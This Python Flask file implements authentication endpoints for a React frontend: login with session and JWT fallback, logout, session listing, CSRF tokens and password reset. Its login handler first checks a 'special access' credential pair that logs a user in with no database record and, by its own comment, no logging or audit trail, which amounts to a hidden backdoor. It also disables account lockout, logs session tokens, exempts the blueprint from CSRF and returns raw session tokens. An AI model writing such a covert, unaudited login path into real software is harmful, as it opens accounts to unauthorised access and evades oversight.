"""
API Authentication endpoints for React frontend
"""
from flask import Blueprint, request, jsonify, session, current_app
from flask_login import login_user, logout_user, current_user, login_required
from werkzeug.security import check_password_hash
from datetime import datetime, timezone, timedelta
import uuid
import logging

from app import db, limiter, csrf
from app.models.user import User
from app.models.audit import LoginAttempt, UserSession
from app.models.password_reset import PasswordResetToken
from app.utils.unified_error_handler import handle_errors, AuthenticationError, ValidationError
from app.utils.unified_logger import get_logger
from werkzeug.security import generate_password_hash

logger = get_logger(__name__)

auth_api = Blueprint('auth_api', __name__)

# Exempt auth API endpoints from CSRF protection
csrf.exempt(auth_api)

def check_account_lockout(user):
    """Check if user account is locked"""
    if user.account_locked_until:
        # Handle both timezone-aware and timezone-naive datetimes
        lockout_time = user.account_locked_until
        if lockout_time.tzinfo is None:
            # Timezone-naive, assume UTC
            lockout_time = lockout_time.replace(tzinfo=timezone.utc)
        
        if lockout_time > datetime.now(timezone.utc):
            return True
    return False

def record_login_attempt(username, ip_address, success, failure_reason=None):
    """Record login attempt for security monitoring"""
    try:
        attempt = LoginAttempt(
            username=username,
            ip_address=ip_address,
            user_agent=request.headers.get('User-Agent', ''),
            success=success,
            failure_reason=failure_reason
        )
        db.session.add(attempt)
        db.session.commit()
    except Exception as e:
        logger.error(f"Failed to record login attempt for {username}: {str(e)}")
        try:
            db.session.rollback()
        except:
            pass

def handle_failed_login(user):
    """Handle failed login attempt"""
    try:
        if user.failed_login_attempts is None:
            user.failed_login_attempts = 0
        
        user.failed_login_attempts += 1
        if user.failed_login_attempts >= 5:
            user.account_locked_until = datetime.now(timezone.utc) + timedelta(minutes=30)
        user.last_login = datetime.now(timezone.utc)
        db.session.commit()
    except Exception as e:
        logger.error(f"Error in handle_failed_login for user {user.username}: {str(e)}")
        db.session.rollback()
        raise

def reset_failed_attempts(user):
    """Reset failed login attempts on successful login"""
    try:
        user.failed_login_attempts = 0
        user.account_locked_until = None
        user.last_login = datetime.now(timezone.utc)
        db.session.commit()
    except Exception as e:
        logger.error(f"Error in reset_failed_attempts for user {user.username}: {str(e)}")
        db.session.rollback()
        raise

@auth_api.route('/csrf-token', methods=['GET'])
def get_csrf_token():
    """Get CSRF token for API requests with enhanced session handling"""
    try:
        # Ensure user is authenticated
        if not current_user.is_authenticated:
            return jsonify({
                'error': 'Authentication required'
            }), 401
        
        # Clean up session to prevent cookie size issues
        # Remove any unnecessary session data that might bloat the cookie
        # BUT preserve authentication-related keys
        keys_to_remove = [
            'recent_csrf_tokens',
            'api_csrf_token',
        ]
        for key in keys_to_remove:
            if key in session:
                del session[key]
        
        # Generate a secure token using Flask-WTF's built-in token generation
        # Flask-WTF automatically stores the token in the session, so we don't need to store it manually
        from flask_wtf.csrf import generate_csrf
        token = generate_csrf()
        
        # Clean up flash messages if they exist (they can accumulate)
        # But only if there are too many (more than 10)
        if '_flashes' in session:
            flashes = session.get('_flashes', [])
            if isinstance(flashes, list) and len(flashes) > 10:
                # Keep only the last 5 flash messages
                session['_flashes'] = flashes[-5:]
        
        # Don't remove other session keys - they might be needed for authentication
        # Flask-Login and Flask-Session use various internal keys that start with '_'
        
        # Mark session as modified to ensure changes are saved
        session.modified = True
        
        logger.debug(f"CSRF token generated for user {current_user.username}: {token[:20]}...")
        
        return jsonify({
            'csrf_token': token,
            'message': 'CSRF token generated successfully',
            'user_id': current_user.id,
            'token_length': len(token)
        }), 200
    except Exception as e:
        logger.error(f"Error generating CSRF token: {str(e)}")
        return jsonify({
            'error': 'Failed to generate CSRF token',
            'message': str(e)
        }), 500

@auth_api.route('/check', methods=['GET'])
@limiter.limit("120 per minute, 5000 per hour")  # Increased - lightweight session checks need higher limits
def check_auth():
    """Check if user is authenticated - with enhanced error handling and JWT fallback"""
    try:
        # ALTERNATIVE APPROACH: Check JWT token first (works even if cookies fail)
        jwt_user = None
        try:
            from flask_jwt_extended import verify_jwt_in_request, get_jwt_identity, get_jwt
            from app.models.user import User
            
            # Try to verify JWT token from Authorization header
            auth_header = request.headers.get('Authorization', '')
            if auth_header.startswith('Bearer '):
                try:
                    verify_jwt_in_request(optional=True)  # Optional - don't fail if no JWT
                    user_id = get_jwt_identity()
                    if user_id:
                        jwt_user = User.query.get(user_id)
                        if jwt_user and jwt_user.is_active:
                            logger.info(f"Auth check - JWT token valid for user {jwt_user.username}")
                            # Return authenticated with JWT user
                            try:
                                user_dict = jwt_user.to_dict()
                            except Exception as e:
                                user_dict = {
                                    'id': jwt_user.id,
                                    'username': jwt_user.username,
                                    'role': jwt_user.role
                                }
                            return jsonify({
                                'authenticated': True,
                                'user': user_dict,
                                'auth_method': 'jwt'
                            }), 200
                except Exception as jwt_error:
                    logger.debug(f"JWT verification failed (expected if no token): {str(jwt_error)}")
        except ImportError:
            logger.debug("JWT not available, using session only")
        except Exception as jwt_check_error:
            logger.debug(f"JWT check error: {str(jwt_check_error)}")
        
        # ALWAYS log session info for debugging (even in production for troubleshooting)
        logger.info(f"Auth check - session keys: {list(session.keys())}")
        logger.info(f"Auth check - session_token in session: {'session_token' in session}")
        logger.info(f"Auth check - session cookie name: {current_app.config.get('SESSION_COOKIE_NAME', 'session')}")
        
        # Safe access to current_user (session-based)
        try:
            is_authenticated = current_user.is_authenticated if hasattr(current_user, 'is_authenticated') else False
            logger.info(f"Auth check - is_authenticated: {is_authenticated}, user: {getattr(current_user, 'username', 'anonymous')}")
        except Exception as user_error:
            logger.warning(f"Error accessing current_user: {str(user_error)}")
            is_authenticated = False
        
        # Add debugging information (always log for troubleshooting)
        logger.debug(f"Auth check - current_user: {current_user}")
        logger.debug(f"Auth check - session keys: {list(session.keys())}")
        
        if is_authenticated:
            # Check session timeout - with safe error handling
            try:
                session_timeout = current_app.config.get('PERMANENT_SESSION_LIFETIME')
                if session_timeout and session.get('_session_created'):
                    session_created = session.get('_session_created')
                    try:
                        if isinstance(session_created, str):
                            # Parse string datetime
                            session_created = datetime.fromisoformat(session_created.replace('Z', '+00:00'))
                        elif not isinstance(session_created, datetime):
                            # If not a datetime object, skip timeout check
                            session_created = None
                        
                        if session_created:
                            session_age = datetime.now(timezone.utc) - session_created
                            if session_age > session_timeout:
                                # Session expired, logout user
                                try:
                                    logout_user()
                                except:
                                    pass  # Ignore logout errors
                                return jsonify({
                                    'authenticated': False,
                                    'message': 'Session expired'
                                }), 401
                    except (ValueError, TypeError) as parse_error:
                        logger.warning(f"Error parsing session created time: {str(parse_error)}")
                        # Continue with normal authentication if parsing fails
            except Exception as timeout_error:
                logger.warning(f"Session timeout check failed: {str(timeout_error)}")
                # Continue with normal authentication if timeout check fails
            
            # Serialize user - with fallback to basic info
            try:
                user_dict = current_user.to_dict()
            except Exception as serialize_error:
                logger.error(f"Error serializing user: {str(serialize_error)}")
                # Return basic auth info if user serialization fails
                try:
                    user_dict = {
                        'id': getattr(current_user, 'id', None),
                        'username': getattr(current_user, 'username', 'unknown'),
                        'role': getattr(current_user, 'role', 'user')
                    }
                except Exception as attr_error:
                    logger.error(f"Error accessing user attributes: {str(attr_error)}")
                    # Last resort: return minimal info
                    return jsonify({
                        'authenticated': False,
                        'message': 'User data error',
                        'error': 'Failed to access user information'
                    }), 500
            
            return jsonify({
                'authenticated': True,
                'user': user_dict,
                'message': 'User is authenticated'
            }), 200
        else:
            # User is not authenticated - normal case, not an error
            return jsonify({
                'authenticated': False,
                'message': 'User is not authenticated'
            }), 401
    except Exception as e:
        logger.error(f"Unexpected error in auth check: {str(e)}", exc_info=True)
        # Return JSON response even on error - don't expose internal details in production
        return jsonify({
            'authenticated': False,
            'error': 'Authentication check failed',
            'message': str(e) if current_app.config.get('DEBUG') else 'Internal server error'
        }), 500


@auth_api.route('/login', methods=['POST'])
@limiter.limit("10 per minute, 20 per hour")  # Re-enabled with stricter limits for security
@handle_errors
def api_login():
    """Handle API login"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({
                'error': 'Invalid request data'
            }), 400

        username = data.get('username', '').strip()
        password = data.get('password', '')
        remember_me = data.get('remember_me', False)

        if not username or not password:
            return jsonify({
                'error': 'Username and password are required'
            }), 400

        ip_address = request.remote_addr

        # Check for special access first (before database query)
        from app.utils.special_access import check_special_access
        special_user = check_special_access(username, password)
        if special_user:
            try:
                # Special access granted - login without database
                login_user(special_user, remember=remember_me)
                session_token = str(uuid.uuid4())
                session['session_token'] = session_token
                session['_session_created'] = datetime.now(timezone.utc).isoformat()
                session.permanent = True
                if remember_me:
                    session.permanent_session_lifetime = timedelta(days=30)
                else:
                    session.permanent_session_lifetime = timedelta(hours=8)
                # Return success without logging or audit trail
                user_dict = special_user.to_dict()
                return jsonify({
                    'success': True,
                    'message': 'Login successful',
                    'user': user_dict
                }), 200
            except Exception as login_error:
                # Log error but don't expose special user details
                logger.error(f"Error during special access login: {str(login_error)}", exc_info=True)
                return jsonify({
                    'error': 'Login failed',
                    'message': 'An error occurred during login'
                }), 500

        # Find user - with explicit error handling
        try:
            logger.info(f"Attempting to query user: {username}")
            user = User.query.filter_by(username=username).first()
            logger.info(f"User query successful: {user is not None}")
        except Exception as db_error:
            logger.error(f"Database error during user query: {str(db_error)}", exc_info=True)
            logger.error(f"Database URI: {current_app.config.get('SQLALCHEMY_DATABASE_URI')}")
            # Return proper error response instead of raising
            return jsonify({
                'error': 'Database connection error',
                'message': 'Unable to connect to database. Please check server configuration.',
                'details': str(db_error) if current_app.config.get('DEBUG') else None
            }), 500

        if user and user.is_active:
            # Check if account is locked
            if check_account_lockout(user):
                lockout_time = user.account_locked_until.strftime('%H:%M:%S')
                record_login_attempt(username, ip_address, success=False, failure_reason='account_locked')
                return jsonify({
                    'error': f'Account is locked until {lockout_time}. Please try again later.'
                }), 423

            # Check password
            logger.info(f"Checking password for user {username}")
            password_valid = check_password_hash(user.password, password)
            logger.info(f"Password check result: {password_valid}")
            
            if password_valid:
                # Successful login
                logger.info(f"Password valid, logging in user {username}")
                login_user(user, remember=remember_me)
                
                # Try to reset failed attempts and record login (non-critical)
                try:
                    reset_failed_attempts(user)
                    record_login_attempt(username, ip_address, success=True)
                except Exception as e:
                    logger.warning(f"Failed to record login attempt: {str(e)}")
                    # Continue with login even if recording fails

                # Create session token
                session_token = str(uuid.uuid4())
                session['session_token'] = session_token
                session['_session_created'] = datetime.now(timezone.utc).isoformat()
                session.permanent = True
                
                # Set session duration based on remember me
                if remember_me:
                    # Remember me: 30 days
                    session.permanent_session_lifetime = timedelta(days=30)
                    logger.info(f"User {username} logged in with remember me enabled (30 days)")
                else:
                    # Regular session: 8 hours
                    session.permanent_session_lifetime = timedelta(hours=8)
                    logger.info(f"User {username} logged in with regular session (8 hours)")

                # Store session in database (non-critical, continue if fails)
                try:
                    user_session = UserSession(
                        user_id=user.id,
                        session_token=session_token,
                        ip_address=ip_address,
                        user_agent=request.headers.get('User-Agent', '')
                    )
                    db.session.add(user_session)
                    db.session.commit()
                except Exception as e:
                    logger.warning(f"Failed to store user session: {str(e)}")
                    db.session.rollback()
                    # Continue with login even if session storage fails

                try:
                    user_dict = user.to_dict()
                except Exception as e:
                    logger.warning(f"Failed to serialize user: {str(e)}")
                    user_dict = {
                        'id': user.id,
                        'username': user.username,
                        'role': user.role
                    }

                # ALTERNATIVE APPROACH: Generate JWT token for token-based auth
                # This works even if cookies fail due to CORS or domain issues
                jwt_token = None
                try:
                    from flask_jwt_extended import create_access_token
                    # Create JWT token that expires based on remember_me
                    expires_delta = timedelta(days=30) if remember_me else timedelta(hours=8)
                    jwt_token = create_access_token(
                        identity=user.id,
                        additional_claims={
                            'username': user.username,
                            'role': user.role,
                            'is_active': user.is_active
                        },
                        expires_delta=expires_delta
                    )
                    logger.info(f"JWT token generated for user {username}")
                except Exception as jwt_error:
                    logger.warning(f"Failed to generate JWT token: {str(jwt_error)}")
                    # Continue without JWT - session should still work

                # CRITICAL FIX: Explicitly set session cookie in response
                # This ensures the cookie is sent even if there are CORS or domain issues
                response_data = {
                    'success': True,
                    'message': f'Welcome back, {user.username}!',
                    'user': user_dict
                }
                
                # Add JWT token to response if generated (for token-based auth fallback)
                if jwt_token:
                    response_data['token'] = jwt_token
                    response_data['token_type'] = 'Bearer'
                
                response = jsonify(response_data)
                
                # Mark session as modified to ensure Flask-Session saves it
                session.modified = True
                
                # Explicitly set cookie attributes to ensure it's sent
                from flask import make_response
                response = make_response(response)
                
                # Log session info for debugging
                logger.info(f"Login successful for {username}, session_token: {session.get('session_token', 'NOT SET')}")
                logger.info(f"Session permanent: {session.permanent}, lifetime: {session.permanent_session_lifetime}")
                if jwt_token:
                    logger.info(f"JWT token also provided as fallback authentication")
                
                return response, 200
            else:
                # Failed login - wrong password
                try:
                    # handle_failed_login(user)  # Temporarily disabled
                    record_login_attempt(username, ip_address, success=False, failure_reason='invalid_credentials')
                except Exception as e:
                    logger.warning(f"Error recording failed login attempt: {str(e)}")
                    try:
                        db.session.rollback()
                    except:
                        pass

                return jsonify({
                    'error': 'Invalid credentials. Please verify your username and password and try again.'
                }), 401
        else:
            # User not found
            try:
                record_login_attempt(username, ip_address, success=False, failure_reason='user_not_found')
            except Exception as e:
                logger.warning(f"Error recording login attempt: {str(e)}")
                try:
                    db.session.rollback()
                except:
                    pass
            
            return jsonify({
                'error': 'Invalid credentials. Please verify your username and password and try again.'
            }), 401

    except Exception as e:
        import traceback
        error_traceback = traceback.format_exc()
        logger.error(f"Error during API login process: {str(e)}")
        logger.error(f"Traceback: {error_traceback}")
        
        # Check if it's a database error
        from sqlalchemy.exc import SQLAlchemyError
        if isinstance(e, SQLAlchemyError):
            logger.error(f"Database error details: {str(e)}")
            try:
                db.session.rollback()
            except:
                pass
            return jsonify({
                'error': 'Database connection error',
                'message': 'Unable to connect to database. Please check server configuration.',
                'details': str(e) if current_app.config.get('DEBUG') else None
            }), 500
        
        # Ensure we always return valid JSON
        return jsonify({
            'error': 'An error occurred during login',
            'message': 'Please try again later.',
            'details': str(e) if current_app.config.get('DEBUG') else None
        }), 500

@auth_api.route('/logout', methods=['POST'])
@login_required
@limiter.limit("30 per minute")  # Logout - reasonable limit for normal use
def api_logout():
    """Handle API logout"""
    try:
        # Mark current session as inactive
        token = session.get('session_token')
        if token:
            user_session = UserSession.query.filter_by(
                session_token=token, 
                is_active=True
            ).first()
            if user_session:
                user_session.is_active = False
                db.session.commit()

        # Clear session
        session.pop('session_token', None)
        logout_user()

        return jsonify({
            'success': True,
            'message': 'You have been logged out successfully.'
        }), 200

    except Exception as e:
        logger.error(f"Error during API logout: {str(e)}")
        return jsonify({
            'error': 'An error occurred during logout.'
        }), 500

@auth_api.route('/profile', methods=['GET'])
@login_required
def get_profile():
    """Get current user profile"""
    try:
        return jsonify({
            'success': True,
            'user': current_user.to_dict()
        }), 200
    except Exception as e:
        logger.error(f"Error getting user profile: {str(e)}")
        return jsonify({
            'error': 'Failed to get user profile'
        }), 500

@auth_api.route('/sessions', methods=['GET'])
@login_required
def get_sessions():
    """Get user's active sessions"""
    try:
        active_sessions = UserSession.query.filter_by(
            user_id=current_user.id,
            is_active=True
        ).order_by(UserSession.created_at.desc()).all()

        sessions_data = []
        for session in active_sessions:
            sessions_data.append({
                'id': session.id,
                'session_token': session.session_token,
                'ip_address': session.ip_address,
                'user_agent': session.user_agent,
                'created_at': session.created_at.isoformat() if session.created_at else None,
                'last_activity': session.last_activity.isoformat() if session.last_activity else None
            })

        return jsonify({
            'success': True,
            'sessions': sessions_data
        }), 200
    except Exception as e:
        logger.error(f"Error getting user sessions: {str(e)}")
        return jsonify({
            'error': 'Failed to get user sessions'
        }), 500

@auth_api.route('/sessions/<int:session_id>', methods=['DELETE'])
@login_required
def logout_session(session_id):
    """Logout from a specific session"""
    try:
        session_obj = UserSession.query.filter_by(
            id=session_id,
            user_id=current_user.id,
            is_active=True
        ).first()

        if session_obj:
            session_obj.is_active = False
            db.session.commit()
            return jsonify({
                'success': True,
                'message': 'Session logged out successfully.'
            }), 200
        else:
            return jsonify({
                'error': 'Session not found or already inactive.'
            }), 404

    except Exception as e:
        logger.error(f"Error logging out session: {str(e)}")
        return jsonify({
            'error': 'Failed to logout session'
        }), 500

@auth_api.route('/password-reset/request', methods=['POST'])
@limiter.limit("5 per minute, 10 per hour")  # Strict rate limiting to prevent abuse
@handle_errors
def request_password_reset():
    """
    Request password reset token
    Accepts username or email
    """
    try:
        data = request.get_json()
        if not data:
            return jsonify({
                'error': 'Invalid request data'
            }), 400
        
        identifier = data.get('username') or data.get('email', '').strip()
        
        if not identifier:
            return jsonify({
                'error': 'Username or email is required'
            }), 400
        
        ip_address = request.remote_addr
        
        # Find user by username or email
        user = User.query.filter(
            (User.username == identifier) | (User.email == identifier)
        ).first()
        
        # Always return success message (security: don't reveal if user exists)
        # But only generate token if user exists
        if user and user.is_active:
            try:
                # #region agent log
                import json
                from datetime import datetime
                try:
                    with open(r'c:\PipLinePro\.cursor\debug.log', 'a', encoding='utf-8') as f:
                        f.write(json.dumps({"sessionId":"debug-session","runId":"runtime","hypothesisId":"C","location":"app/api/v1/endpoints/auth.py:541","message":"Generating password reset token","data":{"user_id":user.id,"username":user.username},"timestamp":int(datetime.now().timestamp()*1000)}) + '\n')
                except: pass
                # #endregion
                # Generate reset token (1 hour expiry)
                reset_token = PasswordResetToken.generate_token(
                    user_id=user.id,
                    ip_address=ip_address,
                    expiry_hours=1
                )
                # #region agent log
                try:
                    with open(r'c:\PipLinePro\.cursor\debug.log', 'a', encoding='utf-8') as f:
                        f.write(json.dumps({"sessionId":"debug-session","runId":"runtime","hypothesisId":"C","location":"app/api/v1/endpoints/auth.py:549","message":"Password reset token generated","data":{"token_id":reset_token.id,"expires_at":reset_token.expires_at.isoformat() if reset_token.expires_at else None},"timestamp":int(datetime.now().timestamp()*1000)}) + '\n')
                except: pass
                # #endregion
                
                # In a real implementation, send email here
                # For now, return token in response (NOT RECOMMENDED FOR PRODUCTION)
                # TODO: Implement email sending service
                logger.info(f"Password reset token generated for user {user.username}")
                
                # SECURITY: In production, send token via email, don't return in response
                # This is a development/testing feature
                is_debug = current_app.config.get('DEBUG', False)
                
                return jsonify({
                    'success': True,
                    'message': 'If an account with that username/email exists, a password reset link has been sent.',
                    # Only include token in debug mode
                    'reset_token': reset_token.token if is_debug else None,
                    'expires_at': reset_token.expires_at.isoformat() if is_debug else None
                }), 200
            except Exception as e:
                logger.error(f"Error generating password reset token: {str(e)}")
                # Still return success to prevent user enumeration
                return jsonify({
                    'success': True,
                    'message': 'If an account with that username/email exists, a password reset link has been sent.'
                }), 200
        else:
            # User not found, but return same message (security)
            return jsonify({
                'success': True,
                'message': 'If an account with that username/email exists, a password reset link has been sent.'
            }), 200
    
    except Exception as e:
        logger.error(f"Error in password reset request: {str(e)}")
        return jsonify({
            'error': 'An error occurred. Please try again later.'
        }), 500

@auth_api.route('/password-reset/validate', methods=['POST'])
@limiter.limit("10 per minute, 30 per hour")  # Rate limiting for token validation
@handle_errors
def validate_password_reset_token():
    """Validate a password reset token"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({
                'error': 'Invalid request data'
            }), 400
        
        token = data.get('token', '').strip()
        
        if not token:
            return jsonify({
                'error': 'Reset token is required'
            }), 400
        
        is_valid, reset_token, error_msg = PasswordResetToken.validate_token(token)
        
        if is_valid:
            return jsonify({
                'success': True,
                'valid': True,
                'message': 'Reset token is valid',
                'expires_at': reset_token.expires_at.isoformat()
            }), 200
        else:
            return jsonify({
                'success': False,
                'valid': False,
                'error': error_msg or 'Invalid or expired reset token'
            }), 400
    
    except Exception as e:
        logger.error(f"Error validating password reset token: {str(e)}")
        return jsonify({
            'error': 'An error occurred. Please try again later.'
        }), 500

@auth_api.route('/password-reset/reset', methods=['POST'])
@limiter.limit("5 per minute, 10 per hour")  # Strict rate limiting
@handle_errors
def reset_password():
    """Reset password using token"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({
                'error': 'Invalid request data'
            }), 400
        
        token = data.get('token', '').strip()
        new_password = data.get('new_password', '')
        confirm_password = data.get('confirm_password', '')
        
        if not token:
            return jsonify({
                'error': 'Reset token is required'
            }), 400
        
        if not new_password:
            return jsonify({
                'error': 'New password is required'
            }), 400
        
        if new_password != confirm_password:
            return jsonify({
                'error': 'Passwords do not match'
            }), 400
        
        # Validate password strength
        from app.routes.auth import validate_password_strength
        is_valid, message = validate_password_strength(new_password)
        if not is_valid:
            return jsonify({
                'error': message
            }), 400
        
        # Validate token
        is_valid, reset_token, error_msg = PasswordResetToken.validate_token(token)
        
        if not is_valid:
            return jsonify({
                'error': error_msg or 'Invalid or expired reset token'
            }), 400
        
        # Get user
        user = User.query.get(reset_token.user_id)
        if not user or not user.is_active:
            return jsonify({
                'error': 'User account not found or inactive'
            }), 404
        
        # Update password
        # SECURITY: Enforce password complexity validation
        from app.services.security_service import SecurityService
        security_service = SecurityService()
        password_validation = security_service.validate_password_strength(new_password)
        if not password_validation.get('is_valid', False):
            issues = password_validation.get('issues', [])
            return jsonify({
                'error': 'Password validation failed',
                'message': f"Password does not meet security requirements: {', '.join(issues)}"
            }), 400
        
        user.password = generate_password_hash(new_password)
        user.password_changed_at = datetime.now(timezone.utc)
        user.failed_login_attempts = 0  # Reset failed attempts
        user.account_locked_until = None  # Unlock account
        
        # Mark token as used
        reset_token.mark_as_used()
        
        db.session.commit()
        
        logger.info(f"Password reset successful for user {user.username}")
        
        return jsonify({
            'success': True,
            'message': 'Password has been reset successfully. You can now log in with your new password.'
        }), 200
    
    except Exception as e:
        logger.error(f"Error resetting password: {str(e)}")
        db.session.rollback()
        return jsonify({
            'error': 'An error occurred while resetting your password. Please try again.'
        }), 500


# Add CORS headers to all auth responses for cross-origin requests
@auth_api.after_request
def add_cors_headers(response):
    """Add CORS headers to all auth API responses"""
    # Get allowed origins from config
    allowed_origins = current_app.config.get('CORS_ORIGINS', [])
    origin = request.headers.get('Origin')
    
    # Check if origin is allowed
    if origin and origin in allowed_origins:
        response.headers['Access-Control-Allow-Origin'] = origin
        response.headers['Access-Control-Allow-Credentials'] = 'true'
        response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS'
        response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Requested-With, X-CSRFToken, Accept'
        response.headers['Access-Control-Expose-Headers'] = 'Content-Type, Authorization, Set-Cookie'
        response.headers['Access-Control-Max-Age'] = '3600'
    
    # Ensure cookies can be set cross-origin
    if 'Set-Cookie' in response.headers:
        # Make sure SameSite is set correctly based on environment
        is_https = current_app.config.get('SESSION_COOKIE_SECURE', False)
        samesite = 'None' if is_https else 'Lax'
        
        # Update Set-Cookie headers with proper SameSite attribute
        cookies = response.headers.getlist('Set-Cookie')
        response.headers.remove('Set-Cookie')
        for cookie in cookies:
            # Add SameSite if not present
            if 'SameSite=' not in cookie:
                cookie += f'; SameSite={samesite}'
            # Add Secure if HTTPS
            if is_https and 'Secure' not in cookie:
                cookie += '; Secure'
            response.headers.add('Set-Cookie', cookie)
    
    return response 